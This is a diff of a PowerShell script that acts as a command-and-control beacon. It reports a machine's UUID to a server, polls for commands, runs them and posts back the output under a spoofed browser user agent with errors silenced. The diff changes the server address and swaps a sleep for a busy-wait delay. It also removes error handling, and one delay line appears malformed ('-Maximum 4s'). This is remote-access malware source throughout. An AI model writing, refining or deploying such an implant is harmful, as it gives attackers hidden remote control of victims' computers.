@@ -1,6 +1,7 @@
 
 $ErrorActionPreference= 'silentlycontinue'
-$SERVER_URL = "http://192.168.1.5/ntfy/"
+
+$SERVER_URL = "http://192.168.1.2/nopo/"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
@@ -84,8 +85,18 @@ while ($true) {
     Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
    
     while ($true) {
-        $TIMER = Get-Random -SetSeed 100 -Maximum 1000
-        sleep -Milliseconds $TIMER
+       # Generate a random delay between 1 and 4 seconds
+       $delay = Get-Random -Minimum 1 -Maximum 4s
+
+       # Record the start time
+       $startTime = Get-Date
+
+        # Busy-wait loop that checks the elapsed time
+        while (($currentTime = Get-Date) - $startTime -lt (New-TimeSpan -Seconds $delay)) {
+            # No other tasks performed here, just checking the time
+        }
+
+
         $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
         $SYSTEM = @{
             uuid = "$UID"
@@ -106,18 +117,12 @@ while ($true) {
             $MODE = $JSON.json
         
             $CMD = $JSON.cmd
-            
+            $RUN = RunCommand $CMD
 
-        try {
-                                    $RUN = RunCommand $CMD
-                                         if ($RUN -eq "" -or $RUN -eq $null) {
-                            $RUN = "No Result"
-                        }
-                                }
-                                catch {
-                                    $RUN = $_.Exception.Message
-                                }
-                        
+            if ($RUN -eq "" -or $RUN -eq $null) {
+                        $RUN = "No Result"
+                    }
+            
             
          
             $CMD_UID = $JSON.cmd_uid
